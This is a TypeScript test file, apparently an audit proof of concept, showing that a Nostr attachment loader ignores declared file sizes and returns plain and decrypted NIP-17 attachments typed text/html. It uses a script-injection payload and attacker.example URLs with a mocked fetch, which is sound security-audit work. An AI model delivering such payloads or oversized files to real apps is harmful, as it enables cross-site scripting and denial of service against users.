// AUDIT PoC (v7.1 review) — not part of the upstream suite. Demonstrates two properties of
// loadAttachment that apps must currently defend against themselves.
import { encryptFile } from "applesauce-common/helpers/encrypted-file";
import { describe, expect, it } from "vitest";
import { loadAttachment } from "./attachments.js";

const serve = (bytes: Uint8Array) => (async () => new Response(bytes)) as unknown as typeof fetch;

describe("audit PoC: loadAttachment", () => {
  it("downloads without any size cap, ignoring the declared size", async () => {
    const huge = new Uint8Array(32 * 1024 * 1024); // 32 MiB served for a file declared as 10 bytes
    const blob = await loadAttachment({ url: "https://attacker.example/huge", type: "image/png", size: 10 }, { fetch: serve(huge) });
    expect(blob.size).toBe(huge.length);
  });

  it("returns an unencrypted attachment typed with the sender-declared active MIME type", async () => {
    const html = new TextEncoder().encode("<script>alert(document.domain)</script>");
    const blob = await loadAttachment({ url: "https://attacker.example/x", type: "text/html" }, { fetch: serve(html) });
    expect(blob.type).toBe("text/html");
  });

  it("returns a decrypted NIP-17 attachment typed text/html, script intact", async () => {
    const encrypted = await encryptFile(new TextEncoder().encode("<script>alert(document.domain)</script>"));
    const blob = await loadAttachment(
      {
        url: "https://attacker.example/x",
        type: "text/html",
        sha256: encrypted.sha256,
        encryptionAlgorithm: "aes-gcm",
        decryptionKey: encrypted.key,
        decryptionNonce: encrypted.nonce,
      },
      { fetch: serve(encrypted.ciphertext) },
    );
    expect(blob.type).toBe("text/html");
    expect(await blob.text()).toContain("<script>");
  });
});
